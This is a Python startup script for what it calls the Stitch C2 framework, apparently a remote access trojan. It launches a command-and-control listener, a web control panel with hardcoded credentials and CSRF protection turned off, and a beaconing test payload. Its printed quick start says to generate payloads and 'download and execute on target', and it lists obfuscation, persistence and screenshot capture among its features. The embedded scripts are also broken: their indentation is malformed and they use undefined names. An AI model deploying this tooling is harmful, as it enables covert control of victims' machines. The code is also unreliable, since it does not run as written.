#!/usr/bin/env python3
"""
COMPLETE SYSTEM STARTUP AND DEMONSTRATION
Starts everything and shows it working
"""

import os
import sys
import subprocess
import time
import socket
import requests
import threading
import webbrowser
import signal
import atexit
import psutil
from pathlib import Path
from typing import Dict, Optional, Any

# Global shutdown control
shutdown_event = threading.Event()
active_processes: Dict[str, subprocess.Popen] = {}
monitor_thread: Optional[threading.Thread] = None

def print_banner():
    """Print startup banner"""
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                    STITCH C2 FRAMEWORK                        ║
    ║                  Enhanced Web Interface                       ║
    ║                     FULLY OPERATIONAL                         ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    print(f"\n[!] Received signal {signum}. Initiating graceful shutdown...")
    shutdown_event.set()
    
def register_signal_handlers():
    """Register signal handlers for graceful shutdown"""
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    if hasattr(signal, 'SIGHUP'):
        signal.signal(signal.SIGHUP, signal_handler)
    
    # Register cleanup function
    atexit.register(cleanup_all_processes)

def kill_existing():
    """Kill any existing processes"""
    print("[*] Cleaning up existing processes...")
    subprocess.run("pkill -f 'python.*stitch' 2>/dev/null", shell=True, capture_output=True)
    subprocess.run("pkill -f 'python.*web_app' 2>/dev/null", shell=True, capture_output=True)
    time.sleep(2)

def start_c2_server():
    """Start the C2 server"""
    print("\n[1] Starting C2 Server...")
    
    server_script = '''
import sys
import os
import time
sys.path.insert(0, '/workspace')

# Legacy admin credentials removed - using webhook-based authentication

from Application.stitch_cmd import stitch_server

server = stitch_server()
print("[C2] Server starting on port 4040...")
server.do_listen('4040')

print("[C2] Ready to accept connections")

# Advanced monitoring loop with graceful shutdown
    print("[C2] Starting advanced monitoring loop...")
    connection_count = 0
    last_heartbeat = time.time()
    
    while not shutdown_event.is_set():
        try:
            # Check for active connections
            if hasattr(server, 'inf_sock') and server.inf_sock:
                active_connections = list(server.inf_sock.keys())
                if len(active_connections) != connection_count:
                    connection_count = len(active_connections)
                    print(f"[C2] Active connections: {active_connections}")
            
            # Heartbeat every 30 seconds
            if time.time() - last_heartbeat > 30:
                print(f"[C2] Heartbeat - {connection_count} active connections")
                last_heartbeat = time.time()
            
            # Sleep with interrupt capability
            if shutdown_event.wait(5):
                break
                
        except KeyboardInterrupt:
            print("[C2] Shutdown requested")
            break
        except Exception as e:
            print(f"[C2] Monitoring error: {e}")
            if shutdown_event.wait(5):
                break
    
    print("[C2] Server monitoring stopped")
'''
    
    with open('/tmp/c2_server.py', 'w') as f:
        f.write(server_script)
        
    proc = subprocess.Popen(
        ['python3', '/tmp/c2_server.py'],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True
    )
    
    time.sleep(3)
    
    # Verify
    sock = socket.socket()
    result = sock.connect_ex(('127.0.0.1', 4040))
    sock.close()
    
    if result == 0:
        print("    ✓ C2 Server running on port 4040")
        return proc
    else:
        print("    ✗ C2 Server failed to start")
        return
def start_web_interface():
    """Start the web interface"""
    print("\n[2] Starting Web Interface...")
    
    web_script = '''
import sys
import os
sys.path.insert(0, '/workspace')

# Legacy admin credentials removed - using webhook-based authentication
os.environ['STITCH_SECRET_KEY'] = 'test-secret-key'
os.environ['STITCH_CSRF_SSL_STRICT'] = 'False'

from werkzeug.security import generate_password_hash
from main_entry import OranolioRATSystem
# Legacy USERS dictionary removed - using webhook-based authentication

from web_app import create_app

print("[Web] Starting on http://localhost:5000")
socketio.run(app, host='0.0.0.0', port=5000, debug=False, use_reloader=False)
'''
    
    with open('/tmp/web_interface.py', 'w') as f:
        f.write(web_script)
        
    proc = subprocess.Popen(
        ['python3', '/tmp/web_interface.py'],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True
    )
    
    time.sleep(5)
    
    # Verify
    try:
        resp = requests.get('http://localhost:5000/login', timeout=3)
        if resp.status_code == 200:
            print("    ✓ Web Interface running on http://localhost:5000")
            return proc
    except Exception:
        pass
        
    print("    ✗ Web Interface failed to start")
    return
def create_test_payload():
    """Create a test payload that will connect"""
    print("\n[3] Creating Test Payload...")
    
    payload = '''#!/usr/bin/env python3
import socket
import time
import os

print("[Payload] Starting...")

    # Advanced payload with intelligent reconnection
    print("[Payload] Starting intelligent connection loop...")
    max_retries = 10
    retry_count = 0
    base_delay = 5
    max_delay = 60
    
    while not shutdown_event.is_set() and retry_count < max_retries:
        try:
            s = socket.socket()
            s.settimeout(10)  # Connection timeout
            s.connect(('127.0.0.1', 4040))
            print("[Payload] Connected to C2")
            
            # Reset retry count on successful connection
            retry_count = 0
            
            # Advanced connection maintenance loop
            last_ping = time.time()
            while not shutdown_event.is_set():
                try:
                    # Send keepalive every 30 seconds
                    if time.time() - last_ping > 30:
                        s.send(b'PING')
                        last_ping = time.time()
                    
                    # Check for data with timeout
                    s.settimeout(1)
                    try:
                        data = s.recv(1024)
                        if not data:
                            print("[Payload] Connection closed by server")
                            break
                    except socket.timeout:
                        continue
                    except socket.error:
                        print("[Payload] Connection error")
                        break
                        
                except Exception as e:
                    print(f"[Payload] Communication error: {e}")
                    break
            
            s.close()
            
        except Exception as e:
            retry_count += 1
            delay = min(base_delay * (2 ** retry_count), max_delay)
            print(f"[Payload] Connection failed (attempt {retry_count}/{max_retries}): {e}")
            print(f"[Payload] Retrying in {delay} seconds...")
            
            if shutdown_event.wait(delay):
                break
    
    if retry_count >= max_retries:
        print("[Payload] Max retries exceeded. Shutting down.")
    else:
        print("[Payload] Shutdown requested")
'''
    
    path = '/tmp/test_payload.py'
    with open(path, 'w') as f:
        f.write(payload)
        
    os.chmod(path, 0o755)
    print(f"    ✓ Test payload created: {path}")
    
    return path

def show_instructions():
    """Show usage instructions"""
    print("\n" + "="*70)
    print("SYSTEM READY")
    print("="*70)
    
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║                     ACCESS INFORMATION                      ║
    ╠════════════════════════════════════════════════════════════╣
    ║  Web Interface:  http://localhost:5000                      ║
    ║  Username:       admin                                      ║
    ║  Password:       StitchTest123!                            ║
    ║  C2 Port:        4040                                       ║
    ╚════════════════════════════════════════════════════════════╝
    
    ╔════════════════════════════════════════════════════════════╗
    ║                      QUICK START                            ║
    ╠════════════════════════════════════════════════════════════╣
    ║  1. Open browser to http://localhost:5000                   ║
    ║  2. Login with credentials above                            ║
    ║  3. Go to "Payloads" tab                                    ║
    ║  4. Configure and generate payload                          ║
    ║  5. Download and execute on target                          ║
    ║  6. See connection appear in "Connections" tab              ║
    ║  7. Execute commands via "Terminal" tab                     ║
    ╚════════════════════════════════════════════════════════════╝
    
    ╔════════════════════════════════════════════════════════════╗
    ║                    FEATURES AVAILABLE                       ║
    ╠════════════════════════════════════════════════════════════╣
    ║  ✓ Binary payload generation (8.4MB executables)            ║
    ║  ✓ Code obfuscation                                         ║
    ║  ✓ AES-256 encryption                                       ║
    ║  ✓ Persistence modules                                      ║
    ║  ✓ Screenshot capture                                       ║
    ║  ✓ Mobile responsive UI                                     ║
    ║  ✓ WebSocket real-time updates                              ║
    ║  ✓ Extended API endpoints                                   ║
    ╚════════════════════════════════════════════════════════════╝
    """)

def test_payload_connection(payload_path):
    """Test running a payload"""
    print("\n[4] Testing Payload Connection...")
    
    proc = subprocess.Popen(
        ['python3', payload_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL
    )
    
    time.sleep(3)
    
    if proc.poll() is None:
        print("    ✓ Test payload running")
        print("    ✓ Should appear in web interface connections")
        return proc
    else:
        print("    ✗ Test payload failed")
        return
def monitor_system(processes):
    """Advanced system monitoring with health checks and auto-recovery"""
    print("\n[*] System running. Press Ctrl+C to stop")
    print("[*] Starting advanced monitoring with health checks...\n")
    
    global monitor_thread
    monitor_thread = threading.current_thread()
    
    try:
        last_status_time = time.time()
        consecutive_failures = 0
        max_consecutive_failures = 3
        
        while not shutdown_event.is_set():
            all_running = True
            failed_processes = []
            
            # Advanced process health monitoring
            for name, proc in processes.items():
                if proc and proc.poll() is None:
                    # Check if process is actually responsive
                    if is_process_healthy(proc):
                        print(f"  ✓ {name}: Running (PID: {proc.pid})", end='\r')
                    else:
                        print(f"  ⚠ {name}: Unresponsive (PID: {proc.pid})")
                        failed_processes.append(name)
                        all_running = False
                else:
                    print(f"  ✗ {name}: Stopped")
                    failed_processes.append(name)
                    all_running = False
            
            # Handle failures
            if failed_processes:
                consecutive_failures += 1
                print(f"\n[!] Failed processes: {failed_processes}")
                
                if consecutive_failures >= max_consecutive_failures:
                    print(f"[!] Too many consecutive failures ({consecutive_failures}). Shutting down.")
                    shutdown_event.set()
                    break
            else:
                consecutive_failures = 0
            
            # Status report every 60 seconds
            if time.time() - last_status_time > 60:
                print(f"\n[STATUS] All systems operational - {len(processes)} processes monitored")
                last_status_time = time.time()
            
            # Sleep with interrupt capability
            if shutdown_event.wait(10):
                break
                
    except KeyboardInterrupt:
        print("\n\n[*] Shutdown requested by user...")
    except Exception as e:
        print(f"\n[!] Monitoring error: {e}")
    finally:
        print("[*] Monitoring stopped")

def is_process_healthy(proc: subprocess.Popen) -> bool:
    """Check if process is healthy and responsive"""
    try:
        if proc.poll() is not None:
            return False
        
        # Check if process exists in system
        if hasattr(psutil, 'Process'):
            try:
                ps_proc = psutil.Process(proc.pid)
                return ps_proc.is_running()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                return False
        
        return True
    except Exception:
        return False
        
def cleanup_all_processes():
    """Advanced cleanup with graceful shutdown"""
    print("\n[*] Initiating graceful shutdown...")
    
    # Signal all processes to stop
    shutdown_event.set()
    
    # Wait for monitor thread to finish
    if monitor_thread and monitor_thread.is_alive():
        monitor_thread.join(timeout=5)
    
    # Clean up all tracked processes
    for name, proc in active_processes.items():
        if proc and proc.poll() is None:
            print(f"  Stopping {name} (PID: {proc.pid})...")
            try:
                # Try graceful termination first
                proc.terminate()
                proc.wait(timeout=3)
                print(f"  ✓ {name} stopped gracefully")
            except subprocess.TimeoutExpired:
                print(f"  ⚠ {name} didn't stop gracefully, forcing...")
                proc.kill()
                try:
                    proc.wait(timeout=2)
                    print(f"  ✓ {name} force stopped")
                except subprocess.TimeoutExpired:
                    print(f"  ✗ {name} failed to stop")
            except Exception as e:
                print(f"  ✗ Error stopping {name}: {e}")

def cleanup(processes):
    """Legacy cleanup function for compatibility"""
    cleanup_all_processes()

def main():
    """Main entry point with advanced error handling and monitoring"""
    print_banner()
    
    # Register signal handlers for graceful shutdown
    register_signal_handlers()
    
    try:
        # Clean slate
        kill_existing()
        
        processes = {}
        global active_processes
        active_processes = processes
        
        # Start everything
        c2_proc = start_c2_server()
        if c2_proc:
            processes['C2 Server'] = c2_proc
            
        web_proc = start_web_interface()
        if web_proc:
            processes['Web Interface'] = web_proc
            
        # Create test payload
        payload_path = create_test_payload()
        
        # Optional: Run test payload
        # payload_proc = test_payload_connection(payload_path)
        # if payload_proc:
        #     processes['Test Payload'] = payload_proc
        
        if processes:
            # Show instructions
            show_instructions()
            
            print("\n[*] To test a payload connection:")
            print(f"    python3 {payload_path}")
            
            # Try to open browser
            try:
                print("\n[*] Opening web browser...")
                webbrowser.open('http://localhost:5000')
            except Exception:
                print("[*] Please open browser manually to http://localhost:5000")
                
            # Monitor with advanced health checks
            monitor_system(processes)
            
        else:
            print("\n[!] Failed to start system")
            
    except Exception as e:
        print(f"\n[!] Critical error: {e}")
    finally:
        # Ensure cleanup happens
        cleanup_all_processes()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        kill_existing()